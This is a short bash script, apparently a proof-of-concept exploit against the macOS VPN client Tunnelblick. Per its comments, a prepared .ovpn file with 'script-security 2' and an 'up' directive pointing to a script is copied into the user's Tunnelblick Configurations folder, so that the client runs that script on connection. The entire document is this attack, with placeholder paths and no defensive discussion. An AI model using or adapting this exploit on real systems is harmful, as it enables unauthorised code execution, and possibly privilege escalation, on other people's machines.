#!/bin/bash

# Path to .ovpn that contains the commands to execute the script
# The commands are:
#   script-security 2
#   up /path/to/script.sh

EXPL_OVPN=/path/to/ovpn/file/containing/code/to/run/script
TARGET=~/Library/Application\ Support/Tunnelblick/Configurations

cp "${EXPL_OVPN}" "${TARGET}"
echo "[*] Copied ${EXPL_OVPN} to ${TARGET}"
